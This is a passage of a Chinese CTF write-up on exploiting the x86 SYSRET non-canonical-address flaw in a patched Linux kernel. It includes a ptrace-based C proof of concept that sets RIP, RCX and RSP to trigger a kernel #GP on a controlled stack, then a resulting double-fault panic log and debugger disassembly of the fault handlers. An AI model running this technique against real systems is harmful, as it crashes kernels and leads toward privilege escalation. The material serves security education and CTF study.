+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">IF</span> (CS.L ≠ <span class="hljs-number">1</span> ) <span class="hljs-keyword">or</span> (IA32_EFER.LMA ≠ <span class="hljs-number">1</span>) <span class="hljs-keyword">or</span> (IA32_EFER.SCE ≠ <span class="hljs-number">1</span>)<br><span class="hljs-comment">(* Not in 64-Bit Mode or SYSCALL/SYSRET not enabled in IA32_EFER *)</span><br><span class="hljs-keyword">THEN</span> #UD; FI;<br><span class="hljs-keyword">IF</span> (CPL ≠ <span class="hljs-number">0</span>) <span class="hljs-keyword">THEN</span> #GP(<span class="hljs-number">0</span>); FI;<br><span class="hljs-keyword">IF</span> (operand size <span class="hljs-keyword">is</span> <span class="hljs-number">64</span>-bit)<br><span class="hljs-keyword">THEN</span> <span class="hljs-comment">(* Return to 64-Bit Mode *)</span><br><span class="hljs-keyword">IF</span> (RCX <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> canonical) <span class="hljs-keyword">THEN</span> #GP(<span class="hljs-number">0</span>);<br>RIP := RCX;<br><span class="hljs-keyword">ELSE</span> <span class="hljs-comment">(* Return to Compatibility Mode *)</span><br>RIP := ECX;<br>FI;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>那么如果我们将题目所给的patch联系起来会发生什么,我们可以知道如果我们的rcx是一个non-canonical地址的话,将会在sysretq指令执行时触发内核态的GP异常,并且此时在sysret前我们恢复了我们的栈指针,这将导致我们可以控制在内核态下的RSP,而导致这一异常的原因是因为Intel本身CPU处理器架构的设计</p>
+<p>下面分别是Intel 和 AMD在处理non-canonical地址的伪指令</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">------------------ INTEL -------------------|-------------------  AMD ----------------------<br>...                                         | ...<br><span class="hljs-keyword">IF</span> (operand size <span class="hljs-keyword">is</span> <span class="hljs-number">64</span>-bit)                 | SYSRET_64BIT_MODE:<br>    <span class="hljs-keyword">THEN</span> <span class="hljs-comment">(* Return to 64-Bit Mode *)</span>        | <span class="hljs-keyword">IF</span> (OPERAND_SIZE == <span class="hljs-number">64</span>) <span class="hljs-comment">&#123;</span><br><span class="hljs-comment">    IF (RCX is not canonical) THEN #GP(0);  | &#123;</span><br><span class="hljs-comment">        RIP := RCX;                         |      CS.sel = (MSR_STAR.SYSRET_CS + 16) OR 3</span><br><span class="hljs-comment">    ELSE (* Return to Compatibility Mode *) |      ...</span><br><span class="hljs-comment">        RIP := ECX;                         | &#125;</span><br>FI<span class="hljs-punctuation">;</span>                                         | ...<br>...                                         | RIP = temp_RIP<br>CS.Selector := CS.Selector <span class="hljs-keyword">OR</span> <span class="hljs-number">3</span><span class="hljs-punctuation">;</span>            | <span class="hljs-keyword">EXIT</span><br>            <span class="hljs-comment">(* RPL forced to 3 *)</span>           |<br>...                                         |<br></code></pre></td></tr></table></figure>
+
+<p>这里最大的差别就是GP异常的发出时间,AMD我们可以看到是先切换CS选择子再报出GP异常,这导致从低特权发出GP异常需要从TSS段当中加载临时栈指针,而Intel架构当中如果从内核发出GP异常则不会切换当前栈指针</p>
+<hr>
+<p>好的,既然已经说明了漏洞的存在,我们该如何利用他呢,也就是说从哪儿构造出这么一个non-canonical地址呢?<br>起初有大师猜测这个非规范地址的构造我们可以在非规范页面的边界进行系统调用,这样导致rip自增从而变成非规范地址,但是Linux似乎不允许访问映射的该页.</p>
+<p>这样下来在zolutal师傅寻找到的sysret bugs早爆出的cve当中使用到了ptrace的手法来修改我们的rip</p>
+<h1 id="0x02-Ptrace-进行寄存器修改"><a href="#0x02-Ptrace-进行寄存器修改" class="headerlink" title="0x02 Ptrace 进行寄存器修改"></a>0x02 Ptrace 进行寄存器修改</h1><p>从网上可以寻找到许多对于ptrace系统调用的使用,我们可以从帮助手册当中搜寻信息:</p>
+<blockquote>
+<p>The  ptrace() system call provides a means by which one process (the “tracer”) may ob‐<br>       serve and control the execution of another process (the  “tracee”),  and  examine  and<br>       change  the  tracee’s  memory and registers.  It is primarily used to implement break‐<br>       point debugging and system call tracing.</p>
+</blockquote>
+<p>这里我们就将子进程作为tracee,父进程作为tracer来进行patch,我们首先要理顺我们的目的:</p>
+<ol>
+<li>我们需要sysret触发GPF</li>
+<li>触发异常需要判定rcx是否是non-canonical地址</li>
+<li>而经过调试可以发现ptrace系统调用修改寄存器是在do_syscall_64执行中间进行修改的</li>
+<li>同样经过调试还有syscall的注释我们知道rcx最初是被赋值为rip的,所以在内核栈上构造的pt_regs-&gt;rcx和pt_regs-&gt;rip是同样的值(<del>别犟,我调过</del>)</li>
+<li>因此我们需要同时修改rip和rcx来避免某种一致性检查,然后为了减少我们的失误风险,我们可以将一些重要的寄存器同时给设置了,这样我们就构造出下面的一个初期poc</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_sysret</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-keyword">struct</span> user_regs_struct *user_regs)</span> &#123;<br>  <span class="hljs-type">long</span> orig_rax;<br>  <span class="hljs-type">int</span> status;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> <span class="hljs-title">regs</span>;</span><br>  <span class="hljs-type">size_t</span> kernel_gs_base = KERNEL_GS_BASE + physmap_offset;<br>  <span class="hljs-built_in">memcpy</span>(&amp;regs, user_regs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> user_regs_struct));<br>  trace_pid = fork();<br>  <span class="hljs-keyword">if</span> (trace_pid &lt; <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;fork failed&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!trace_pid) &#123; <span class="hljs-comment">// 如果为0则说明是child</span><br>    <span class="hljs-keyword">if</span> (ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;     <span class="hljs-comment">//代表自动让父进程作为tracer</span><br>      perror(<span class="hljs-string">&quot;PTRACE_TRACEME&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    raise(SIGSTOP);         <span class="hljs-comment">//通知父进程哥们要fork了</span><br>    fork();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 否则是father</span><br>    waitpid(trace_pid, &amp;status, <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 设置选项在下一个fork处停止被tracee，并自动开始跟踪新分叉的进程，该进程将以SIGSTOP</span><br>    <span class="hljs-comment">// 或 PTRACE_EVENT_STOP（如果使用PTRACE_SEIZE）开始。</span><br>    ptrace(PTRACE_SETOPTIONS, trace_pid, <span class="hljs-number">0</span>, PTRACE_O_TRACEFORK);<br>    ptrace(PTRACE_CONT, trace_pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);           <span class="hljs-comment">//继续中断的子进程</span><br>    waitpid(trace_pid, &amp;status, <span class="hljs-number">0</span>);             <span class="hljs-comment">//执行到这儿说明子进程已经断在fork了</span><br>    regs.rip = <span class="hljs-number">0x8000000000000000</span>;              <span class="hljs-comment">//一眼顶针non-canonical (bushi</span><br>    regs.rcx = <span class="hljs-number">0x8000000000000000</span>;<br>    regs.rsp = addr;<br>    regs.eflags = <span class="hljs-number">0x246</span>;<br>    regs.r11 = <span class="hljs-number">0x246</span>;<br>    regs.ss = <span class="hljs-number">0x2b</span>;<br>    regs.cs = <span class="hljs-number">0x33</span>;<br>    <span class="hljs-comment">/* construct the fake path */</span><br>    ptrace(PTRACE_SETREGS, trace_pid, <span class="hljs-literal">NULL</span>, &amp;regs);<br>    ptrace(PTRACE_CONT, trace_pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    ptrace(PTRACE_DETACH, trace_pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> <span class="hljs-title">gift_house</span>;</span><br>  do_sysret((<span class="hljs-type">uint64_t</span>)<span class="hljs-number">0xdeadbeef</span>, &amp;gift_house); <span class="hljs-comment">//</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>该poc应该是简单易懂,此时我们直接上机运行,我们立刻就出现了内核panic</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">ctf@corctf:</span>~$ [    <span class="hljs-number">4.360500</span>] traps: PANIC: double fault, error_code: <span class="hljs-number">0x0</span><br>[    <span class="hljs-number">4.360506</span>] double fault: <span class="hljs-number">0000</span> [#<span class="hljs-number">1</span>] PREEMPT SMP NOPTI<br>[    <span class="hljs-number">4.360512</span>] <span class="hljs-meta">CPU</span>: <span class="hljs-number">0</span> PID: <span class="hljs-number">78</span> Comm: exploit <span class="hljs-keyword">Not</span> tainted <span class="hljs-number">6.3</span><span class="hljs-number">.4</span> #<span class="hljs-number">7</span><br>[    <span class="hljs-number">4.360517</span>] Hardware name: QEMU Standard PC (i440FX + PIIX, <span class="hljs-number">1996</span>), BIOS Arch Linux <span class="hljs-number">1.16</span><span class="hljs-number">.3</span>-<span class="hljs-number">4</span><br>[    <span class="hljs-number">4.360519</span>] <span class="hljs-built_in">RIP</span>: <span class="hljs-number">0010</span>:entry_SYSRETQ_unsafe_stack+<span class="hljs-number">0x3</span>/<span class="hljs-number">0x6</span><br>[    <span class="hljs-number">4.360530</span>] Code: 3c <span class="hljs-number">25</span> d6 0f <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7 eb <span class="hljs-number">08</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7 <span class="hljs-number">48</span> 0f ba ef 3f <span class="hljs-number">48</span> <span class="hljs-number">81</span> cf <span class="hljs-number">00</span> <span class="hljs-number">08</span> <span class="hljs-number">8</span><br>[    <span class="hljs-number">4.360533</span>] <span class="hljs-built_in">RSP</span>: <span class="hljs-number">0018</span>:00000000deadbeef EFLAGS: <span class="hljs-number">00010046</span><br>[    <span class="hljs-number">4.360538</span>] <span class="hljs-built_in">RAX</span>: 000000000000004f <span class="hljs-built_in">RBX</span>: 000000000040f4f4 <span class="hljs-built_in">RCX</span>: <span class="hljs-number">8000000000000000</span><br>[    <span class="hljs-number">4.360541</span>] <span class="hljs-built_in">RDX</span>: 00000000004b5970 <span class="hljs-built_in">RSI</span>: 00000000017c26f0 <span class="hljs-built_in">RDI</span>: 00007fffd1cfb5c0<br>[    <span class="hljs-number">4.360543</span>] <span class="hljs-built_in">RBP</span>: 00007fffd1d9d218 R08: 000000000040f4f4 R09: 00007fffd1cfb59e<br>[    <span class="hljs-number">4.360545</span>] <span class="hljs-built_in">R10</span>: 00000000017c25e0 <span class="hljs-built_in">R11</span>: <span class="hljs-number">0000000000000246</span> <span class="hljs-built_in">R12</span>: 000000000040f4f4<br>[    <span class="hljs-number">4.360547</span>] <span class="hljs-built_in">R13</span>: <span class="hljs-number">0000000000000000</span> <span class="hljs-built_in">R14</span>: <span class="hljs-number">0000000000021050</span> <span class="hljs-built_in">R15</span>: 00000000004ae7c0<br>[    <span class="hljs-number">4.360549</span>] <span class="hljs-built_in">FS</span>:  000000000040ffb2(<span class="hljs-number">0000</span>) <span class="hljs-built_in">GS</span>:ffff88813bc00000(<span class="hljs-number">0000</span>) knlGS:ffff88813bc00000<br>[    <span class="hljs-number">4.360558</span>] <span class="hljs-built_in">CS</span>:  <span class="hljs-number">0010</span> <span class="hljs-built_in">DS</span>: <span class="hljs-number">0000</span> <span class="hljs-built_in">ES</span>: <span class="hljs-number">0000</span> <span class="hljs-built_in">CR0</span>: <span class="hljs-number">0000000080050033</span><br>[    <span class="hljs-number">4.360561</span>] <span class="hljs-built_in">CR2</span>: 00000000deadbed8 <span class="hljs-built_in">CR3</span>: 0000000100a7e005 <span class="hljs-built_in">CR4</span>: 0000000000770ef0<br>[    <span class="hljs-number">4.360563</span>] PKRU: <span class="hljs-number">55555554</span><br>[    <span class="hljs-number">4.360565</span>] <span class="hljs-keyword">Call</span> Trace:<br>[    <span class="hljs-number">4.360566</span>] Modules linked <span class="hljs-keyword">in</span>:<br>[    <span class="hljs-number">4.369035</span>] ---[ end trace <span class="hljs-number">0000000000000000</span> ]---<br>[    <span class="hljs-number">4.369036</span>] <span class="hljs-built_in">RIP</span>: <span class="hljs-number">0010</span>:entry_SYSRETQ_unsafe_stack+<span class="hljs-number">0x3</span>/<span class="hljs-number">0x6</span><br>[    <span class="hljs-number">4.369038</span>] Code: 3c <span class="hljs-number">25</span> d6 0f <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7 eb <span class="hljs-number">08</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7 <span class="hljs-number">48</span> 0f ba ef 3f <span class="hljs-number">48</span> <span class="hljs-number">81</span> cf <span class="hljs-number">00</span> <span class="hljs-number">08</span> <span class="hljs-number">8</span><br>[    <span class="hljs-number">4.369039</span>] <span class="hljs-built_in">RSP</span>: <span class="hljs-number">0018</span>:00000000deadbeef EFLAGS: <span class="hljs-number">00010046</span><br>[    <span class="hljs-number">4.369039</span>] <span class="hljs-built_in">RAX</span>: 000000000000004f <span class="hljs-built_in">RBX</span>: 000000000040f4f4 <span class="hljs-built_in">RCX</span>: <span class="hljs-number">8000000000000000</span><br>[    <span class="hljs-number">4.369040</span>] <span class="hljs-built_in">RDX</span>: 00000000004b5970 <span class="hljs-built_in">RSI</span>: 00000000017c26f0 <span class="hljs-built_in">RDI</span>: 00007fffd1cfb5c0<br>[    <span class="hljs-number">4.369040</span>] <span class="hljs-built_in">RBP</span>: 00007fffd1d9d218 R08: 000000000040f4f4 R09: 00007fffd1cfb59e<br>[    <span class="hljs-number">4.369041</span>] <span class="hljs-built_in">R10</span>: 00000000017c25e0 <span class="hljs-built_in">R11</span>: <span class="hljs-number">0000000000000246</span> <span class="hljs-built_in">R12</span>: 000000000040f4f4<br>[    <span class="hljs-number">4.369041</span>] <span class="hljs-built_in">R13</span>: <span class="hljs-number">0000000000000000</span> <span class="hljs-built_in">R14</span>: <span class="hljs-number">0000000000021050</span> <span class="hljs-built_in">R15</span>: 00000000004ae7c0<br>[    <span class="hljs-number">4.369042</span>] <span class="hljs-built_in">FS</span>:  000000000040ffb2(<span class="hljs-number">0000</span>) <span class="hljs-built_in">GS</span>:ffff88813bc00000(<span class="hljs-number">0000</span>) knlGS:ffff88813bc00000<br>[    <span class="hljs-number">4.369044</span>] <span class="hljs-built_in">CS</span>:  <span class="hljs-number">0010</span> <span class="hljs-built_in">DS</span>: <span class="hljs-number">0000</span> <span class="hljs-built_in">ES</span>: <span class="hljs-number">0000</span> <span class="hljs-built_in">CR0</span>: <span class="hljs-number">0000000080050033</span><br>[    <span class="hljs-number">4.369044</span>] <span class="hljs-built_in">CR2</span>: 00000000deadbed8 <span class="hljs-built_in">CR3</span>: 0000000100a7e005 <span class="hljs-built_in">CR4</span>: 0000000000770ef0<br>[    <span class="hljs-number">4.369045</span>] PKRU: <span class="hljs-number">55555554</span><br>[    <span class="hljs-number">4.369045</span>] Kernel panic - <span class="hljs-keyword">not</span> syncing: Fatal exception <span class="hljs-keyword">in</span> interrupt<br>[    <span class="hljs-number">4.369180</span>] Kernel Offset: disabled<br></code></pre></td></tr></table></figure>
+<p>从中我们可以看出内核PANIC后面跟着的是double fault,什么是double fault呢?真的就是字面意思,两次fault,甚至还有triple fault<br>但triple fault不涉及本次题目,这里出现double fault对于我们来说是成功的早期标识但也使得我们需要面对下一个挑战,为什么这么说呢?<br>立刻揭晓,double fault说明我们成功触发了GPF异常,但是GPF异常的处理程序执行过程中又触发了错误,那么接下来我们的任务就是需要去解决它,<br>我们可以直接查看GPF的处理程序<code>asm_exc_general_protection</code></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; x/20i asm_exc_general_protection <br>   <span class="hljs-number">0xffffffff81a00a90</span> &lt;asm_exc_general_protection&gt;:	<span class="hljs-keyword">nop</span><br>   <span class="hljs-number">0xffffffff81a00a91</span> &lt;asm_exc_general_protection+<span class="hljs-number">1</span>&gt;:	<span class="hljs-keyword">nop</span><br>   <span class="hljs-number">0xffffffff81a00a92</span> &lt;asm_exc_general_protection+<span class="hljs-number">2</span>&gt;:	<span class="hljs-keyword">nop</span><br>   <span class="hljs-number">0xffffffff81a00a93</span> &lt;asm_exc_general_protection+<span class="hljs-number">3</span>&gt;:	<span class="hljs-keyword">cld</span><br>   <span class="hljs-number">0xffffffff81a00a94</span> &lt;asm_exc_general_protection+<span class="hljs-number">4</span>&gt;:	<br>    <span class="hljs-keyword">call</span>   <span class="hljs-number">0xffffffff81a011c0</span> &lt;error_entry&gt;<br>   <span class="hljs-number">0xffffffff81a00a99</span> &lt;asm_exc_general_protection+<span class="hljs-number">9</span>&gt;:	<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0xffffffff81a00a9c</span> &lt;asm_exc_general_protection+<span class="hljs-number">12</span>&gt;:	<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rsp</span><br>   <span class="hljs-number">0xffffffff81a00a9f</span> &lt;asm_exc_general_protection+<span class="hljs-number">15</span>&gt;:	<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x78</span>]<br>   <span class="hljs-number">0xffffffff81a00aa4</span> &lt;asm_exc_general_protection+<span class="hljs-number">20</span>&gt;:	<br>    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x78</span>],<span class="hljs-number">0xffffffffffffffff</span><br>   <span class="hljs-number">0xffffffff81a00aad</span> &lt;asm_exc_general_protection+<span class="hljs-number">29</span>&gt;:	<br>    <span class="hljs-keyword">call</span>   <span class="hljs-number">0xffffffff81816050</span> &lt;exc_general_protection&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这里看到对于GP异常的入口函数并没有过多的操作,然后他调用了<code>error_entry</code>函数</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; x/70i error_entry<br>   <span class="hljs-number">0xffffffff81a011c0</span> &lt;error_entry&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rsi</span><br>   <span class="hljs-number">0xffffffff81a011c1</span> &lt;error_entry+<span class="hljs-number">1</span>&gt;:	<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x8</span>]<br>   <span class="hljs-number">0xffffffff81a011c6</span> &lt;error_entry+<span class="hljs-number">6</span>&gt;:	<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x8</span>],<span class="hljs-built_in">rdi</span><br>   <span class="hljs-number">0xffffffff81a011cb</span> &lt;error_entry+<span class="hljs-number">11</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rdx</span><br>   <span class="hljs-number">0xffffffff81a011cc</span> &lt;error_entry+<span class="hljs-number">12</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span><br>   <span class="hljs-number">0xffffffff81a011cd</span> &lt;error_entry+<span class="hljs-number">13</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0xffffffff81a011ce</span> &lt;error_entry+<span class="hljs-number">14</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">r8</span><br>   <span class="hljs-number">0xffffffff81a011d0</span> &lt;error_entry+<span class="hljs-number">16</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">r9</span><br>   <span class="hljs-number">0xffffffff81a011d2</span> &lt;error_entry+<span class="hljs-number">18</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">r10</span><br>   <span class="hljs-number">0xffffffff81a011d4</span> &lt;error_entry+<span class="hljs-number">20</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">r11</span><br>   <span class="hljs-number">0xffffffff81a011d6</span> &lt;error_entry+<span class="hljs-number">22</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rbx</span><br>   <span class="hljs-number">0xffffffff81a011d7</span> &lt;error_entry+<span class="hljs-number">23</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rbp</span><br>   <span class="hljs-number">0xffffffff81a011d8</span> &lt;error_entry+<span class="hljs-number">24</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">r12</span><br>   <span class="hljs-number">0xffffffff81a011da</span> &lt;error_entry+<span class="hljs-number">26</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">r13</span><br>   <span class="hljs-number">0xffffffff81a011dc</span> &lt;error_entry+<span class="hljs-number">28</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">r14</span><br>   <span class="hljs-number">0xffffffff81a011de</span> &lt;error_entry+<span class="hljs-number">30</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">r15</span><br>   <span class="hljs-number">0xffffffff81a011e0</span> &lt;error_entry+<span class="hljs-number">32</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rsi</span><br>   <span class="hljs-number">0xffffffff81a011e1</span> &lt;error_entry+<span class="hljs-number">33</span>&gt;:	<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">esi</span>,<span class="hljs-built_in">esi</span><br>   <span class="hljs-number">0xffffffff81a011e3</span> &lt;error_entry+<span class="hljs-number">35</span>&gt;:	<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">edx</span><br>   <span class="hljs-number">0xffffffff81a011e5</span> &lt;error_entry+<span class="hljs-number">37</span>&gt;:	<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">ecx</span><br>   <span class="hljs-number">0xffffffff81a011e7</span> &lt;error_entry+<span class="hljs-number">39</span>&gt;:	<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">r8d</span>,<span class="hljs-built_in">r8d</span><br>   <span class="hljs-number">0xffffffff81a011ea</span> &lt;error_entry+<span class="hljs-number">42</span>&gt;:	<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">r9d</span>,<span class="hljs-built_in">r9d</span><br>   <span class="hljs-number">0xffffffff81a011ed</span> &lt;error_entry+<span class="hljs-number">45</span>&gt;:	<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">r10d</span>,<span class="hljs-built_in">r10d</span><br>   <span class="hljs-number">0xffffffff81a011f0</span> &lt;error_entry+<span class="hljs-number">48</span>&gt;:	<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">r11d</span>,<span class="hljs-built_in">r11d</span><br>   <span class="hljs-number">0xffffffff81a011f3</span> &lt;error_entry+<span class="hljs-number">51</span>&gt;:	<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">ebx</span><br>   <span class="hljs-number">0xffffffff81a011f5</span> &lt;error_entry+<span class="hljs-number">53</span>&gt;:	<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">ebp</span>,<span class="hljs-built_in">ebp</span><br>   <span class="hljs-number">0xffffffff81a011f7</span> &lt;error_entry+<span class="hljs-number">55</span>&gt;:	<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">r12d</span>,<span class="hljs-built_in">r12d</span><br>   <span class="hljs-number">0xffffffff81a011fa</span> &lt;error_entry+<span class="hljs-number">58</span>&gt;:	<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">r13d</span>,<span class="hljs-built_in">r13d</span><br>   <span class="hljs-number">0xffffffff81a011fd</span> &lt;error_entry+<span class="hljs-number">61</span>&gt;:	<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">r14d</span>,<span class="hljs-built_in">r14d</span><br>   <span class="hljs-number">0xffffffff81a01200</span> &lt;error_entry+<span class="hljs-number">64</span>&gt;:	<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">r15d</span>,<span class="hljs-built_in">r15d</span><br>   <span class="hljs-number">0xffffffff81a01203</span> &lt;error_entry+<span class="hljs-number">67</span>&gt;:	<span class="hljs-keyword">test</span>   <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x90</span>],<span class="hljs-number">0x3</span><br>   <span class="hljs-number">0xffffffff81a0120b</span> &lt;error_entry+<span class="hljs-number">75</span>&gt;:	<span class="hljs-keyword">je</span>     <span class="hljs-number">0xffffffff81a0125c</span> &lt;error_entry+<span class="hljs-number">156</span>&gt;<br>   <span class="hljs-number">0xffffffff81a0120d</span> &lt;error_entry+<span class="hljs-number">77</span>&gt;:	<span class="hljs-keyword">swapgs</span><br></code></pre></td></tr></table></figure>
+
+
+
